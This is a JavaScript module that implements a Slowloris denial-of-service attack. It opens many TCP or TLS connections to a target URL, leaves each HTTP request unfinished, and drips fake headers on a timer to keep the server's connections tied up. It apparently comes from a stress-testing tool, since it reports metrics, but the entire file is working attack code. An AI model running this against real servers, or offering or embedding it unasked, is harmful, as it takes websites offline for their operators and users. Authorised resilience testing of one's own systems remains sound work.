import net from 'net';
import tls from 'tls';
import { URL } from 'url';

export async function runSlowloris(target, config, durationSeconds) {
  const {
    concurrent_connections = 150,
    headers_interval_ms    = 10_000,
  } = config;

  const url     = new URL(target);
  const isHttps = url.protocol === 'https:';
  const host    = url.hostname;
  const port    = parseInt(url.port) || (isHttps ? 443 : 80);

  const endTime = Date.now() + durationSeconds * 1000;
  let opened = 0, closed = 0;

  function openConnection() {
    return new Promise((resolve) => {
      const opts = { host, port, rejectUnauthorized: false, timeout: 30_000 };

      const sock = isHttps
        ? tls.connect(opts, onConnect)
        : net.connect(opts, onConnect);

      function onConnect() {
        opened++;
        // Partial HTTP request — intentionally missing the final \r\n\r\n
        sock.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Fusill/1.0\r\n`);

        // Drip fake headers to keep the connection alive
        const interval = setInterval(() => {
          if (Date.now() >= endTime || sock.destroyed) {
            clearInterval(interval);
            sock.destroy();
            resolve();
            return;
          }
          sock.write(`X-Keep-${Date.now()}: alive\r\n`);
        }, headers_interval_ms);

        const cleanup = () => { clearInterval(interval); closed++; resolve(); };
        sock.on('error', cleanup);
        sock.on('close', cleanup);
      }

      sock.on('error', () => resolve()); // connection refused — skip silently
    });
  }

  await Promise.all(Array.from({ length: concurrent_connections }, openConnection));

  return {
    avgLatencyMs      : 0,
    errorRateBps      : opened > 0 ? Math.round((closed / opened) * 10000) : 10_000,
    requestsCompleted : opened,
  };
}
